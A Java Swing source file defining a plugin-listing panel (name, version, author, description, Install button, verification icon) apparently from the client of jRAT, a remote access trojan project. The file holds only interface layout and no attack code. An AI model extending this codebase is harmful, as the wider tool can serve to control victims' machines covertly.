package su.jrat.client.ui.panels;

import java.awt.Dimension;

import javax.swing.JButton;
import javax.swing.JPanel;

import su.jrat.client.addons.OnlinePlugin;

import javax.swing.JLabel;

import java.awt.Font;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;

import java.awt.Color;

import javax.swing.JSeparator;
import javax.swing.ImageIcon;

import com.redpois0n.graphs.monitors.IconUtils;

@SuppressWarnings("serial")
public class PluginPanel extends JPanel {

	private int index;
	private OnlinePlugin op;
	private JLabel lblPluginName;
	private JLabel lblAuthorText;
	private JLabel lblVersion;
	private JLabel lblDescription;
	private JLabel lblAuthor;
	private JButton btnAction;
	private JLabel lblVerified;
	
	public PluginPanel(OnlinePlugin op) {
		this.op = op;
		
		setPreferredSize(new Dimension(600, 100));
		
		lblPluginName = new JLabel("Plugin Name");
		lblPluginName.setFont(new Font("Tahoma", Font.BOLD, 11));
		
		lblVersion = new JLabel("Version");
		lblVersion.setForeground(Color.LIGHT_GRAY);
		
		lblAuthorText = new JLabel("Author:");
		
		JSeparator separator = new JSeparator();
		
		lblDescription = new JLabel("Description");
		
		lblAuthor = new JLabel("Author");
		
		btnAction = new JButton("Install");
		
		lblVerified = new JLabel("");
		lblVerified.setToolTipText("Files not hosted by jRAT");
		lblVerified.setIcon(new ImageIcon(PluginPanel.class.getResource("/icons/log_warning.png")));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.TRAILING)
				.addComponent(separator, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE)
				.addGroup(groupLayout.createSequentialGroup()
					.addGap(82)
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
						.addComponent(lblDescription)
						.addGroup(groupLayout.createSequentialGroup()
							.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
								.addGroup(groupLayout.createSequentialGroup()
									.addComponent(lblAuthorText)
									.addPreferredGap(ComponentPlacement.UNRELATED)
									.addComponent(lblAuthor))
								.addGroup(groupLayout.createSequentialGroup()
									.addComponent(lblPluginName)
									.addGap(18)
									.addComponent(lblVersion)))
							.addPreferredGap(ComponentPlacement.RELATED, 196, Short.MAX_VALUE)
							.addComponent(lblVerified)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(btnAction, GroupLayout.PREFERRED_SIZE, 123, GroupLayout.PREFERRED_SIZE)))
					.addContainerGap())
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING, false)
						.addGroup(groupLayout.createSequentialGroup()
							.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
								.addComponent(lblPluginName)
								.addComponent(lblVersion)
								.addComponent(lblVerified))
							.addPreferredGap(ComponentPlacement.RELATED)
							.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
								.addComponent(lblAuthorText)
								.addComponent(lblAuthor)))
						.addComponent(btnAction, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(lblDescription)
					.addPreferredGap(ComponentPlacement.RELATED, 33, Short.MAX_VALUE)
					.addComponent(separator, GroupLayout.PREFERRED_SIZE, 2, GroupLayout.PREFERRED_SIZE))
		);
		setLayout(groupLayout);
		
		update();
	}
	
	public void update() {
		setDescription(op.getDescription());
		setAuthor(op.getAuthor());
		setVersion(op.getVersion());
		setPluginName(op.getName());
		setVerified(op.isUrlVerified());
	}
	
	public void setIndex(int i) {
		this.index = i;
	}
	
	public void setDescription(String text) {
		lblDescription.setText(text);
	}
	
	public void setAuthor(String text) {
		lblAuthor.setText(text);
	}
	
	public void setVersion(String text) {
		lblVersion.setText(text);
	}
	
	public void setPluginName(String text) {
		lblPluginName.setText(text);
	}
	
	public void setVerified(boolean verified) {
		if (verified) {
			lblVerified.setIcon(IconUtils.getIcon("enabled"));
		}
	}
}
